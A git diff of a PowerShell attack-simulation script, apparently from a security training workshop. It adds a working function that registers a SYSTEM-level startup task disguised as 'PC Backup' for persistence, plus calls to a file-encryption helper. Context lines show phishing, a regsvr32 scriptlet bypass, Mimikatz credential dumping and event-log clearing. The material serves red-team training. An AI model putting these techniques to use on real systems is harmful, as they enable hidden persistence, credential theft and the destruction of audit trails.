@@ -1,3 +1,39 @@
+function CreateScheduledTask($name, $scriptPath, $localPath, $user, $password)
+{
+    $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument " -file `"$scriptPath`""
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+    $taskname = $name + " $user";
+
+    if ($user -eq "SYSTEM")
+    {
+        $params = @{
+            Action  = $action
+            Trigger = $trigger
+            TaskName = $taskname
+            User = "System"
+            RunLevel = "Highest"
+        }
+    }
+    else
+    {
+        $params = @{
+            Action  = $action
+            Trigger = $trigger
+            TaskName = $taskname
+            User = $user
+            Password = $password
+            RunLevel = "Highest"
+        }
+    }
+    
+    if(Get-ScheduledTask -TaskName $params.TaskName -EA SilentlyContinue) { 
+        Set-ScheduledTask @params
+        }
+    else {
+        Register-ScheduledTask @params
+    }
+}
+
 #executes phishing attack
 function SendEmail($userEmail, $attachment)
 {
@@ -75,8 +111,13 @@ function ExecuteDocm()
     regsvr32.exe /s /u /i:test.sct scrobj.dll
     regsvr32.exe /s /u /i:test.sct PrintIsolationProxy.dll
 
+    #do some encryption
+    . "c:\labfiles\#WORKSHOP_NAME#\artifacts\environment-setup\automation\EncryptHelper.ps1"
+    EncryptFiles;
+
     #create a task schedule job...persistence
-    #TODO
+    $scriptPath = "C:\LabFiles\#WORKSHOP_NAME#\artifacts\day-02\Enumerate.ps1"
+    CreateScheduledTask "PC Backup" $scriptPath $null "SYSTEM" $null;
 }
 
 function RunMimikatz()
@@ -90,6 +131,15 @@ function RunMimikatz()
 function GoLateral()
 {
     #connect to another machine
+}
+
+function EncryptFiles()
+{
+    #TODO
+}
+function SetRegistryKeys()
+{
+    #TODO
 }
 
 function clear-all-event-logs ($computerName="localhost")
